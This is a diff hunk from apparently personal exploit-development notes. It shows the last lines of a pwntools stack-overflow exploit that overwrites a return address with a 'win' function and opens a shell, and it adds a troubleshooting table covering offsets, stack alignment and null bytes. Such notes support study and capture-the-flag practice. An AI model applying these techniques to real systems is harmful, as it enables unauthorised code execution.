@@ -71,3 +71,11 @@ payload += p64(win)         # overwrite return address
 p.sendline(payload)
 p.interactive()             # catch the shell
 ```
+
+## <span style="color:rgb(146, 208, 80)">Things that go wrong:</span> 
+| PROBLEM                | FIX                                        |
+| ---------------------- | ------------------------------------------ |
+| Offset is wrong        | Recalculate with cyclic, check RIP not RSP |
+| RIP value truncated    | Use RSP instead: `x/gx $rsp`               |
+| Segfault at system()   | Stack alignment issue, add `ret` gadget    |
+| Address has null bytes | Find a different target address            |
